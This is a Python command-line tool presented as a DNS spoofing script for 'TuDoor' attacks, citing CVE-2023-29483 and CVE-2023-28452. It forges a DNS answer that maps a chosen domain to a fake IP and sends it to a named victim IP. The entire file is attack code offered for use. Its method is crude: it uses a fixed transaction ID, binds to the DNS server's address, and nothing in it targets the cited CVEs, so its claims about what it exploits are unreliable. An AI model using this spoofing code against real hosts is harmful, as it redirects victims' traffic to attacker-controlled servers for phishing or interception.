import socket
import struct
import argparse

# Display tool information at the start
def display_info():
    info = """
    Developer : ACyber.ir
    Version   : 1.0.1
    Develop Time : 5-10-2024
    CVE-2023-29483, CVE-2023-28452
    """
    print(info)

# Create a fake DNS packet
def create_dns_packet(domain, ip):
    # DNS header settings
    transaction_id = b'\xaa\xaa'  # Transaction ID
    flags = b'\x81\x80'           # Standard response
    questions = b'\x00\x01'       # 1 question
    answer_rrs = b'\x00\x01'      # 1 answer
    authority_rrs = b'\x00\x00'   # No authority records
    additional_rrs = b'\x00\x00'  # No additional records

    # DNS question section (domain name)
    qname = b''.join([bytes([len(x)]) + x.encode() for x in domain.split('.')]) + b'\x00'
    qtype = b'\x00\x01'           # Question type A (IPv4 address)
    qclass = b'\x00\x01'          # Class IN (Internet)

    # DNS answer section
    answer_name = b'\xc0\x0c'     # Pointer to the question
    answer_type = b'\x00\x01'     # Type A (IPv4)
    answer_class = b'\x00\x01'    # Class IN
    ttl = struct.pack('!I', 60)   # Time to live (60 seconds)
    rdlength = b'\x00\x04'        # Length of the IPv4 address
    rdata = socket.inet_aton(ip)  # Fake IP address

    # Final DNS packet (question + answer)
    packet = (transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs +
              qname + qtype + qclass +
              answer_name + answer_type + answer_class + ttl + rdlength + rdata)
    return packet

# Send the fake DNS response
def send_dns_response(victim_ip, dns_server_ip, domain, fake_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((dns_server_ip, 53))  # Bind to port 53 for DNS
    packet = create_dns_packet(domain, fake_ip)
    sock.sendto(packet, (victim_ip, 53))
    sock.close()

# About section
def show_about():
    about_text = """
    This is a script for testing and executing the TuDoor attacks,
    developed by the A Cyber Security Team.
    """
    print(about_text)

# Parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="DNS Spoofing Tool")
    parser.add_argument('--d', type=str, help='Domain to spoof (e.g., example.com)')
    parser.add_argument('--vip', type=str, help='Victim\'s IP address (e.g., 192.168.1.100)')
    parser.add_argument('--dns', type=str, help='DNS Server IP (e.g., 192.168.1.1)')
    parser.add_argument('--fip', type=str, help='Fake IP address to use in the DNS response (e.g., 1.2.3.4)')
    parser.add_argument('--about', action='store_true', help='Show information about the tool')
    return parser.parse_args()

if __name__ == "__main__":
    # Display tool information when the script starts
    display_info()

    # Parse command-line arguments
    args = parse_arguments()

    # If --about is passed, show the about section
    if args.about:
        show_about()
    elif args.d and args.vip and args.dns and args.fip:
        # If required parameters are provided, execute DNS spoofing
        send_dns_response(args.vip, args.dns, args.d, args.fip)
    else:
        print("Please provide all required arguments or use --about for more information.")
